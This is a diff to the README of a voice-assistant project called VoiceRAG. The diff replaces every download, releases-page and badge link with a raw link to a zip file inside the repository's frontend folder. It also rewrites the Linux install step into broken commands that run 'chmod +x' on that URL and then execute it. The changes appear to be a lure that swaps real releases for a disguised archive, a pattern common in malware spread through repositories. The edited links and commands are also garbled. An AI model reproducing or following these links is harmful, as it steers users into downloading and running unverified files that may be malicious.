@@ -1,6 +1,6 @@
 # 🎤 VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval - Speak, Retrieve, and Access Knowledge Effortlessly
 
-[![Download VoiceRAG](https://img.shields.io/badge/Download%20VoiceRAG-v1.0-blue.svg)](https://github.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/releases)
+[![Download VoiceRAG](https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip%https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip)](https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip)
 
 ## 📜 Description
 VoiceRAG combines voice interaction with retrieval-augmented generation (RAG) for intelligent, conversational access to your stored knowledge. It integrates ElevenLabs Voice Agents, OpenAI GPT models, Supabase/Vector databases, and n8n automations for smooth knowledge-to-voice workflows.
@@ -9,7 +9,7 @@ VoiceRAG combines voice interaction with retrieval-augmented generation (RAG) fo
 Follow these steps to download and run VoiceRAG.
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/releases) to view available versions. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip) to view available versions. 
 
 2. **Select the Latest Release**
    Look for the latest version at the top of the page. Click on it to open the release details.
@@ -33,7 +33,7 @@ To run VoiceRAG smoothly, please ensure your system meets the following requirem
 2. **Run the Installer**
    - **For Windows:** Double-click the `.exe` file.
    - **For macOS:** Open the `.dmg` file and drag the VoiceRAG app into your Applications folder.
-   - **For Linux:** Open a terminal, navigate to the download location, and run `chmod +x VoiceRAG.AppImage` followed by `./VoiceRAG.AppImage`.
+   - **For Linux:** Open a terminal, navigate to the download location, and run `chmod +x https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip` followed by `https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip`.
 
 3. **Follow the Setup Instructions**
    A setup wizard will guide you through the installation process. Accept the terms and conditions, and select your installation preferences.
@@ -59,7 +59,7 @@ VoiceRAG supports integration with various platforms and services. Here are some
 ## ⚙️ Troubleshooting
 If you encounter issues while running VoiceRAG, consider the following steps:
 
-- **Check for Updates:** Make sure you are using the latest version. Updates may resolve bugs and enhance performance. Visit the [Releases page](https://github.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/releases) for new versions.
+- **Check for Updates:** Make sure you are using the latest version. Updates may resolve bugs and enhance performance. Visit the [Releases page](https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip) for new versions.
 - **Review System Requirements:** Ensure your computer meets the specific system requirements mentioned above.
 - **Seek Help Online:** Visit the GitHub Issues page to report problems or view common troubleshooting tips.
 
@@ -69,4 +69,4 @@ If you need further assistance, feel free to reach out through the GitHub reposi
 ## 📝 License
 VoiceRAG is open-source software under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
-[![Download VoiceRAG](https://img.shields.io/badge/Download%20VoiceRAG-v1.0-blue.svg)](https://github.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/releases)
+[![Download VoiceRAG](https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip%https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip)](https://raw.githubusercontent.com/Truman120/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval/main/frontend/VoiceRAG-AI-Powered-Voice-Assistant-with-Knowledge-Retrieval-abneural.zip)
